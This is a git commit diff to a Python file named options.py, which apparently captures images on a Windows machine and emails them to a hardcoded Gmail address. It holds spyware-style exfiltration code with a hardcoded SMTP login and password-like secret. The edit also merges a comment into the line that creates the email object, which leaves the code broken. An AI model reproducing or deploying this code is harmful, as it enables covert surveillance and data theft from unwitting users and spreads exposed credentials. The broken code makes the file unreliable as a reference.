c3f3c5124b5c06b66f758f90c662f187dd5ad9b9
pc <pc-windows@gmail.com>
2023-02-10 18:11:01 +0100

    I forgot

--- options.py
+++ options.py
@@ -11,8 +11,7 @@ import time
 # Ruta del path
 path = subprocess.run("powershell $env:tmp", stdout=subprocess.PIPE, universal_newlines=True, shell=True)
 path = path.stdout
-# Estanciamos los objetos a usar
-em = EmailMessage()
+# Estanciamos los objetos a usarem = EmailMessage()
 context = ssl.create_default_context()
 
 
@@ -28,22 +27,21 @@ def capture_image(image_name):
 
 def send_image(path_image, email="juanmapipa4@gmail.com"):
     print ("Path image ==> ",path_image)
-    try : 
-        # Send Email
+   
+    # Send Email
+    em['From'] = 'caca@gmailcom'
+    em['To'] = email
+    em['Subject'] = 'Capture Image'
 
-        em['From'] = 'caca@gmailcom'
-        em['To'] = email
-        em['Subject'] = 'Capture Image'
+    em.set_content("Capture Image:")
+    # Adjuntamos Imagen
+    
+    file = open(path_image, "rb")
+    attach_image = MIMEImage(file.read())
+    em.add_attachment(attach_image)
 
-        em.set_content("Capture Image:")
-        # Adjuntamos Imagen
-        file = open(path_image, "rb")
-        attach_image = MIMEImage(file.read())
-        em.add_attachment(attach_image)
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+        smtp.login('monolocacapop', 'ngkdwjlpolfrzyop')
+        smtp.sendmail('monolocacapop', email,em.as_string())
 
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
-            smtp.login('monolocacapop', 'ngkdwjlpolfrzyop')
-            smtp.sendmail('monolocacapop', email, em.as_string())
-    except:
-        print ("No se pudo enviar")
 
